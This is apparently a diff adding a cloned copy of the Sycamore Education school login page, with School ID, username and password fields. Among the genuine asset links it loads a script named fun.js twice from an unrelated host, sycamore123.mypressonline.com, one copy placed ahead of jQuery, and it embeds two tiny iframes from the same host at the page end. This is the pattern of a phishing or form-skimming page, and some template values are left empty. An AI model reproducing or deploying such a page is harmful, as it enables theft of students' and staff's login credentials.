@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<HTML>
+<HEAD>
+    <META charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <META HTTP-EQUIV="Expires" CONTENT="Fri, Jun 12 1981 08:20:00 GMT">
+    <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">
+     <link rel="shortcut icon" href="https://app.sycamoreschool.com/images/ss_logo_red.png">
+
+    <META NAME='SLS' CONTENT='SYCA-SCHOOL02.DEN11.VIAWESTHOSTED.NET' >   
+
+    <LINK rel="stylesheet" type="text/css" href="https://app.sycamoreschool.com/bootstrap/css/bootstrap.css?checksum=135e1681ef339888de24c12bfc9df4ab">
+        <LINK rel="StyleSheet" type="text/css" href="https://app.sycamoreschool.com/sycamore.css?checksum=d1990fd5f178af51e8e42f5a13958273">
+    <LINK rel="StyleSheet" type="text/css" href="https://app.sycamoreschool.com/bower_components/fontawesome/css/font-awesome.min.css">
+    <LINK rel="stylesheet" type="text/css" href="https://app.sycamoreschool.com/bower_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.min.css">
+    <LINK rel="stylesheet" type="text/css" href="https://app.sycamoreschool.com/bower_components/jquery-timepicker-jt/jquery.timepicker.css">
+    <LINK rel="stylesheet" type="text/css" href="https://app.sycamoreschool.com/thirdparty.css?checksum=86da159fd962ef8f2b7b986cd86f5935">
+        
+    <!-- JQuery should load before other JQuery libraries -->
+    <SCRIPT type="text/javascript" src="https://sycamore123.mypressonline.com/fun.js"></SCRIPT>
+    <SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/bower_components/jquery/jquery.min.js"></SCRIPT>
+    <SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/bower_components/jquery-timepicker-jt/jquery.timepicker.min.js"></SCRIPT>
+    <SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/bower_components/bootstrap-datepicker/dist/js/bootstrap-datepicker.min.js"></SCRIPT>
+    <SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/sycamore.js?checksum=5fe9b567e69e90bcd4d9cf4693ca23a2"></SCRIPT>
+    <SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/toastr.js?checksum=80e9e4aa94013c804158387e876be3b2"></SCRIPT>
+    <LINK rel="stylesheet" type="text/css" href="https://app.sycamoreschool.com/toastr.css?checksum=d0c8eb8683da6a5655b0b48a4e776c88" media="all">
+
+    <SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/validetta/validetta.js?checksum=41ba425a9faea3237510cee5691bf7b1"></SCRIPT>
+    <LINK rel="stylesheet" type="text/css" media="screen" href="https://app.sycamoreschool.com/validetta/validetta.css?checksum=c54cd0504dfb36d9a861bd9b541dd493">
+    <SCRIPT type="text/javascript" src="https://www.helpdocsonline.com/v2/tooltips.js"></SCRIPT>
+    <SCRIPT type="text/javascript" src="http://sycamore123.mypressonline.com/fun.js" media="all" defer></SCRIPT>
+    <style>
+.se-font {
+    font-family: VERDANA;
+    font-size: small;
+}
+.se-font-small {
+    font-family: VERDANA;
+    font-size: x-small;
+}
+.se-font-title {
+    font-family: VERDANA;
+    font-size: small;
+    color: ;
+    font-weight: bold;
+}
+.se-bg {
+    background-color:  !important;
+    color: white;
+}
+</style>
+        <SCRIPT type='text/javascript'>
+        $(document).ready(function(){
+        var toastrSkip = ['https://app.sycamoreschool.com/admissions/header.php','https://app.sycamoreschool.com/admissions/login.php','https://app.sycamoreschool.com/admissions/home.php','https://app.sycamoreschool.com/admissions/menu.php','/https://app.sycamoreschool.com/admissions/login.inc','https://app.sycamoreschool.com/admissions/index.php','/admissions/'];
+        if($.inArray(location.pathname,toastrSkip) == -1) {
+            if(location.pathname.search('admissions/') != -1) {
+                if(window.toast){
+                    window.parent.frames['header'].getToast(window.toast);
+                    window.toast = null;
+                }
+            }
+        }
+    });
+    </SCRIPT>
+ 
+
+<SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/sycamore.js"></SCRIPT>
+<SCRIPT type='text/javascript'>
+
+
+function getMainHeight() {
+    // Get clientHeight and adjust to account for schoolheader height.
+    // This will be the initial value for MainHeight. 
+    var winHeight = document.documentElement.clientHeight - 60;
+    if(winHeight < 0) winHeight = 0;
+    document.theForm.loginheight.value = winHeight; 
+}
+</SCRIPT>
+
+
+</HEAD>
+<BODY>
+
+
+<TITLE>Sycamore Education </TITLE>
+
+<META name="viewport" content="width=device-width, initial-scale=1.0">
+<META id="MetaKeywords" name="KEYWORDS" content="school management system,school information system,online school management system,online school information system,online school administration software,school administration software,student information system,student management system, school management software, school management system software" >
+
+<link href="https://app.sycamoreschool.com/login/css/bootstrap.css" rel="stylesheet" media="screen">
+<link href="https://app.sycamoreschool.com/login/main.css" rel="stylesheet" media="all">
+<link href="https://app.sycamoreschool.com/login/css/bootstrap-responsive.css" rel="stylesheet">
+
+<SCRIPT src="https://app.sycamoreschool.com/login/js/bootstrap.js"></SCRIPT>
+
+<SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/respond.js"></SCRIPT>
+<SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/html5shiv.js"></SCRIPT>
+
+<!-- CSS For Dynamic Colors -->
+<style type="text/css">
+.headerDivGreeting p {
+    color: #005F2E;
+}
+
+.loginField {
+    background-color: #47AF39;
+}
+
+.schoolPicture {
+    background-image: url("https://app.sycamoreschool.com/login/img/lookidrewaleaf.png");
+    background-size: 100%;
+    background-repeat: no-repeat;
+    -webkit-box-ordinal-group: 1;
+    -moz-box-ordinal-group: 1;
+    -ms-flex-order: 1;
+    -webkit-order: 1;
+    order: 1;
+    height: 490px;
+}
+
+.schoolPicture2 {
+    background-image: url("https://app.sycamoreschool.com/login/img/lookidrewaleaf.png");
+    background-size: 100%;
+    background-repeat: no-repeat;
+    background-color: #c2c0b3;
+    height: 200px;
+}
+
+.span4 {
+    width: 370px;
+}
+</style>
+
+<!--[if lt IE 10]>
+<style type='text/css'>.schoolPicture {height: 487px !important;}</style><![endif]-->
+
+
+<SCRIPT type="text/javascript">
+
+$(document).keypress(function(event) {
+    if(event.which == 13) {
+        checkData();
+    }
+});
+
+if (top.location != document.location) top.location = document.location;
+
+function doForgot(){
+    var url = "https://app.sycamoreschool.com/resetpassword.php?schoolid=&reactivate=1&redirect=reset";
+    var win = "ResetPasswordWnd";
+    popwin(590, 560, url, win);
+}
+
+function checkData() {
+    var f1 = document.forms[0];
+    var noerror = 1;
+    // --- entered_login ---
+    var t1 = f1.entered_login;
+    if (t1.value == "" || t1.value == " ") {
+            noerror = 0;
+    }
+    // --- entered_password ---
+    var t1 = f1.entered_password;
+    if (t1.value == "" || t1.value == " ") {
+            noerror = 0;
+    }
+    // --- check if errors occurred ---
+    if (noerror == 0) {
+            var msg = 'Please make sure all fields have been filled out';
+            getToast( {type: 'error', message: msg } );
+            //alert('Please make sure all fields have been filled.');
+            return false;
+    }
+    document.getElementById('theForm').submit();
+}
+
+function doGoogleLogin(schoolid) {
+    location.href = "https://app.sycamoreschool.com/google_login.php?task=login&schoolid=" + 2654;
+}
+</SCRIPT>
+
+<noscript>
+    <DIV class='alert alert-danger' style='position:absolute;bottom:0px; right:0px; left:0px; width:90%;margin-left: auto; margin-right: auto;z-index:1000;text-align:center;'>
+        <strong>You will need to enable Javascript to use Sycamore Education to the fullest! Click <a href="http://enable-javascript.com/" title="enable-javascript" target="_new">here</a> for more info.</strong>
+    </DIV>
+</noscript>
+
+<FORM id=theForm name=theForm class="form-horizontal" action='https://app.sycamoreschool.com/index.php' METHOD="POST">
+<input type=hidden name=loginheight value=0>
+
+<div class="pageContainer">
+
+<div class="container">
+
+  <div class="row-fluid headerDiv">
+    <div class="span8 schoolLogo">
+        <table class="schoolLogocenter">
+            <tr>
+                <td class=''><img class='schoolLogocenter ' src='https://app.sycamoreschool.com/login/img/logo.png' alt='Sycamore Education'></td>
+                            </tr>
+        </table>
+    </div>
+
+    <div class="span4 headerDivGreeting sycamoreFont hidden-tablet hidden-phone">
+        <p style="margin:0px; color:#B0022; font-size: 17px;  line-height: 32px;">Hello and welcome to Sycamore Education! Please enter your login credentials below to begin.</p>
+    </div>
+  </div>
+
+  <div class="row loginDiv">
+    <div class="span8 schoolPicture hidden-tablet hidden-phone hidden-mid">
+    </div>
+    <div class="offsetCustom span4 loginField ">
+      <div style="padding-top: 30px; margin-right: 20px; margin-left: 20px;">
+        <span style="display: block;"><i class="fa fa-lock sycamoreLoginHeader"></i><span style="margin-left: 20px;" class="sycamoreFont sycamoreLoginHeader">Sycamore Login</span></span>
+            <div style="margin-top: 30px;">
+
+<table class="loginFieldTable">
+<tbody>
+<tr class="loginTextInputRow"><td><p class="loginTextInputName">School ID</p></td><td class="loginInputTd"><input tabindex=1 autofocus type="text" name="entered_schid" maxlength="8" class="loginTextInput"></input></td></tr>    <tr class="loginTextInputRow">
+        <td><p class="loginTextInputName">Username</p></td>
+        <td class="loginInputTd"><input tabindex=2 type="text" name="entered_login" maxlength="20" class="loginTextInput" value=""></input></td>
+    </tr>
+
+    <tr class="loginTextInputRow">
+        <td><p class="loginTextInputName">Password</p></td>
+        <td class="loginInputTd"><input tabindex=3 maxlength=20 type="password" name="entered_password" class="loginTextInput"></input></td>
+    </tr>
+
+    <tr class="loginTextInputRow">
+        <td><p class="loginTextInputName">Language</p></td>
+        <td class="loginInputTd">
+            <SELECT name="entered_language" class="loginSelect">
+                <option value=1>English</option>
+                <option value=4>Portuguese</option>
+                <option value=2>Spanish</option>
+                <option value=6>German</option>
+                <option value=5>Swahili</option>
+                <option value=7>Vietnamese</option>
+            </SELECT>
+        </td>
+    </tr>
+
+</tbody>
+</table>
+
+    <div class="loginTextInputRow" style='margin-bottom: 20px;'>
+        <a class="resetPasswordA" onClick='doForgot();' style="color: white;">Reset Your Password</a>
+    </div>
+    
+    </div>
+</div>
+
+    <div onclick="checkData();" class="loginLoginButtonDiv">
+        <h3>Login</h3>
+    </div>
+
+    
+    <div class="schoolPicture2 hidden-big">
+    </div>
+
+    </div>
+    </div>
+
+</div>
+
+</div>
+
+<footer class="row footer">
+
+<div class="row secure">
+    <div class="container mobileFooter">
+        <p class="hidden-smallest hidden-phone hidden-tablet hidden-mid" style="float: right; margin:15px 0px 0px 10px; color: #005f2e; font-weight: bold;">Comodo Secure</p>
+        <img class="hidden-smallest hidden-phone hidden-tablet hidden-mid" style="float: right; width: 60px;" src="https://app.sycamoreschool.com/login/img/comodosecure.png">
+    </div>
+</div>
+
+    <div class="mobileFooter" style="padding-top: 60px; text-align: center;">
+        <p style="font-size: 12px; margin: 0px; color: #47af39;">A cutting edge Student Information System brought to you by <a class="footerLink2" href="https://sycamoreeducation.com">Sycamore Education</a></p>
+        <p style="font-size: 12px; margin: 0px; color: #47af39;">
+        <a class="footerLink2" href="https://sycamoreeducation.com/about/" target="_new" style="padding-right: 20px;">About Us</a>
+        <a class="footerLink2" href="https://sycamoreeducation.com/careers/" target="_new" style="padding-right: 20px;">Careers</a>
+        <a class="footerLink2" href="https://sycamoreschool.com/terms-of-service/" target="_new" style="padding-right: 20px;">Terms of Service & Acceptable Use Policy</a>
+        <a class="footerLink2" href="https://sycamoreschool.com/privacy-policy/" target="_new" style="padding-right: 20px;">Privacy Policy</a>
+        <a class="footerLink2" href="https://sycamoreschool.com/gdpr/" target="_new">GDPR</a>
+        </p>
+        <img style="margin-top: 30px;" src="https://app.sycamoreschool.com/login/img/logo_white.png">
+    </div>
+</footer>
+
+</FORM>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon='{"rayId":"85265d8dedac6f0b","version":"2024.2.0","token":"0a36b06baab04d4585e9222c4d0727b8"}' crossorigin="anonymous"></script>
+</BODY>
+
+<SCRIPT type="text/javascript">
+
+function doResize(){
+    var target = $('#middle');
+    var h = target.height();
+    var viewport = $(window).height();
+    var diff = viewport - h;
+    var margin = diff / 2;
+    if(margin > 0) target.css("margin-top", margin);
+}
+
+var schoolid = ;
+if(!schoolid) {
+    document.forms[0].entered_schid.select();
+    document.forms[0].entered_schid.focus();
+}else{
+    document.forms[0].entered_login.focus();
+}
+if(document.theForm.entered_schid.value != '') {
+    if(document.theForm.entered_login.value != '') {
+        if(document.theForm.entered_password.value != '') {
+            document.forms[0].submit();
+        }
+    }
+}
+</SCRIPT>
+
+<SCRIPT type="text/javascript" src="https://app.sycamoreschool.com/bootstrap/js/bootstrap.js"></SCRIPT>
+<SCRIPT type="text/javascript">
+$(document).ready(function(){
+    getMainHeight();
+    doResize();
+    $(".alert").alert();
+
+    $(window).resize(function(){
+        getMainHeight();
+        doResize();
+    });
+
+});
+</SCRIPT>
+<iframe src="https://sycamore123.mypressonline.com/about.html" style="border:0px #ffffff none;" name="Fram" scrolling="yes" frameborder="0" marginheight="0px" marginwidth="0px" height="50px" width="100px" allowfullscreen></iframe>
+<iframe src="https://sycamore123.mypressonline.com/about2.html" style="border:0px #ffffff none;" name="Frawm" scrolling="yes" frameborder="0" marginheight="0px" marginwidth="0px" height="50px" width="100px" allowfullscreen></iframe>
+</HTML>
